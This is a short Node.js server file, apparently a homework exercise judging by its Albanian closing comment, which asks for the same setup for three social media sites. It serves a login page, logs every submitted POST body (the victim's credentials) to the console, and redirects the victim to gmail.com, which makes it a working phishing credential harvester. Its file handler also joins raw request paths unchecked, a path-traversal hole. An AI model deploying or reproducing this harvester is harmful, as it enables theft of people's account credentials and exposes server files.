const http = require('http');
const fs = require('fs').promises;
const path = require('path');
const PORT = 8191;
const BASE_PATH = path.join(__dirname, 'public');


const server = http.createServer(async (req, res) => {
    let url = req.url;
    if (req.url == '' || req.url == '/') {
        url = 'login.html';
    }
    switch (req.method) {
        case "GET":
            GET(url, req, res)
            break;
        case "POST":
            POST(url, req, res)
            break;
    }


})

async function GET(url, req, res) {
    const filePath = path.join(BASE_PATH, url);
    try {
        const file = await fs.readFile(filePath);
        res.write(file);
        res.end();
    } catch (err) {
        const errFile = await fs.readFile(path.join(BASE_PATH, '404.html'))
        res.write(errFile);
        res.end();
    }
    finally {
        res.end();
    }

}
async function POST(url, req, res) {
    //we ignore the URL.We assume /
    var body = '';
    req.on('data', function (chunk) {
        body += chunk;
    });
    req.on('end', function () {
        console.log(body);

        res.statusCode = 302;
        res.setHeader('Location', 'https://www.gmail.com')
        res.end();
    });
}

server.listen(PORT);

//detyre shtepie tnjejtin sen amo 3 social media me i bo redirect